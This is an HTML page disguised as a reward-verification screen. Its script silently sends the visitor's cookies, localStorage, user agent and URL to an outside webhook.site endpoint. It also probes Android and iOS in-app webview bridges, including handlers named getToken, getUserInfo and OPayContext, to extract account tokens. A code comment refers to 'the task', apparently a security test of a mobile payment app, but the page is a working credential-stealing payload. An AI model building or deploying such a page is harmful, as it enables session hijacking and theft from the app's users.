<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Checking Reward...</title>
    <style>
        body { font-family: sans-serif; background: #000; color: #00c853; text-align: center; padding: 50px; }
        .spinner { width: 40px; height: 40px; border: 4px solid #222; border-top: 4px solid #00c853; border-radius: 50%; animation: spin 1s linear infinite; margin: auto; }
        @keyframes spin { 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="spinner"></div>
    <p>Verifying Rewards...</p>
    <div id="logs" style="font-size: 10px; margin-top: 20px;"></div>

    <script>
        var WEBHOOK = "https://webhook.site/5647901c-5075-426c-b7cd-36410cd3d562";
        
        function exfil(data, tag) {
            var x = new XMLHttpRequest();
            x.open("POST", WEBHOOK + "?t=" + tag, true);
            x.send(JSON.stringify(data));
        }

        function log(m) { document.getElementById("logs").innerHTML += "> " + m + "<br>"; }

        // Start Exfiltration
        (function() {
            var d = { ua: navigator.userAgent, url: location.href, ts: new Date().toISOString() };
            exfil(d, "init");

            // 1. Android/Legacy Bridge
            try {
                if (window.control && window.control.getBaseInfo) {
                    var info = window.control.getBaseInfo();
                    exfil({ src: "control.getBaseInfo", data: info }, "TOKEN");
                    log("Exfiltrated Android Data");
                }
            } catch(e) {}

            // 2. iOS WKWebView MessageHandlers (The Target)
            try {
                if (window.webkit && window.webkit.messageHandlers) {
                    log("iOS WebKit Bridge Found");
                    
                    // Specific handler mentioned in the task
                    if (window.webkit.messageHandlers.control) {
                        log("Target 'control' handler found");
                        window.webkit.messageHandlers.control.postMessage("getBaseInfo");
                        window.webkit.messageHandlers.control.postMessage({ action: "getBaseInfo" });
                        window.webkit.messageHandlers.control.postMessage({ method: "getToken" });
                    }

                    // Scan other common handlers
                    var targets = ['getBaseInfo', 'getToken', 'getUserInfo', 'getAccountInfo', 'OPayContext'];
                    targets.forEach(function(h) {
                        try {
                            if (window.webkit.messageHandlers[h]) {
                                log("Found handler: " + h);
                                window.webkit.messageHandlers[h].postMessage("");
                            }
                        } catch(e) {}
                    });
                }
            } catch(e) { log("iOS Error: " + e.message); }

            // 3. Fallback: URL/Cookie/Storage
            exfil({ cookie: document.cookie, ls: JSON.stringify(localStorage) }, "STORAGE");
        })();
    </script>
</body>
</html>
